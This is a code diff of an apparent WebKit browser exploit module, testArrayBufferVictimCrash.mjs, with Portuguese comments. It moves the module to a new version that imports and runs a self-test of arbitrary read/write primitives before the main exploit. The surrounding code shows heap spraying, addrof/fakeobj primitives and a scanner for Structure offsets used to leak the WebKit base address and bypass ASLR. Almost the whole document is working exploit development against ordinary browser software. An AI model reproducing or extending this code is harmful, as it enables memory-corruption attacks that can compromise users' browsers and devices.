@@ -1,8 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v119 - R60 Final com Verificação e Robustez Máxima e SCANNER de OFFSET da Structure)
+// js/script3/testArrayBufferVictimCrash.mjs (v120 - R60 Final com Verificação e Robustez Máxima e SCANNER de OFFSET da Structure, C/ TESTE ARB_RW)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA TODAS AS PRIMITIVAS (ADDROF/FAKEOBJ, ARB_READ/ARB_WRITE) DO core_exploit.mjs para maior estabilidade e clareza.
 // - **ADICIONADO: Scanner de offsets para a Structure* do JSCell do Uint8Array, para maior adaptabilidade.**
+// - **ADICIONADO: Execução inicial de selfTestOOBReadWrite para validar primitivas arb_read/arb_write.**
 // - Redução drástica da verbosidade dos logs de debug para facilitar a leitura.
 // - Spray volumoso e persistente.
 // - Verificação e validação contínuas em cada etapa crítica.
@@ -21,12 +22,13 @@ import {
     fakeobj_core,            // Importar fakeobj_core do core_exploit
     initCoreAddrofFakeobjPrimitives, // Importar função de inicialização
     arb_read,                // Importar arb_read direto do core_exploit
-    arb_write                // Importar arb_write direto do core_exploit
+    arb_write,               // Importar arb_write direto do core_exploit
+    selfTestOOBReadWrite     // Importar selfTestOOBReadWrite
 } from '../core_exploit.mjs';
 
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v119_R60_ASLR_LEAK_CLEANER_SCANNER"; // Renamed for clarity and scanner
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v120_R60_ASLR_LEAK_CLEANER_SCANNER_ARB_TEST"; // Renamed for clarity and scanner
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -108,8 +110,6 @@ async function scanForStructurePointerAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM,
     logFn(`[SCANNER] Varredura de offsets concluída. Total de candidatos promissores: ${scan_results.length}`, "subtest", FNAME);
 
     if (scan_results.length > 0) {
-        // Retornar o primeiro resultado promissor, ou o que tiver o maior nível de confiança.
-        // Aqui, retornamos o primeiro, mas em um cenário real você poderia ter lógica para escolher o "melhor".
         return scan_results[0];
     } else {
         logFn(`[SCANNER] Nenhum offset da Structure* que leve a uma base WebKit reconhecível foi encontrado dentro do range ${toHex(SCAN_RANGE_START)}-${toHex(SCAN_RANGE_END)}.`, "error", FNAME);
@@ -129,6 +129,18 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     try {
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
+
+        // --- NOVO PASSO: VALIDAR PRIMITIVAS ARB_READ/ARB_WRITE ---
+        logFn("--- FASE 0: Validando primitivas arb_read/arb_write com selfTestOOBReadWrite ---", "subtest");
+        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
+        if (!arbTestSuccess) {
+            const errMsg = "Falha crítica: As primitivas arb_read/arb_write não estão funcionando. Abortando a exploração.";
+            logFn(errMsg, "critical");
+            throw new Error(errMsg);
+        }
+        logFn("Primitivas arb_read/arb_write validadas com sucesso. Prosseguindo com a exploração.", "good");
+        await pauseFn(LOCAL_MEDIUM_PAUSE);
+
 
         // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
@@ -158,7 +170,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // NEW: Initialize core addrof/fakeobj primitives
-        initCoreAddrofFakeobjPrimitives(); // As funções de log já são configuradas globalmente via setLogFunction em utils.mjs
+        initCoreAddrofFakeobjPrimitives();
         logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");
 
 
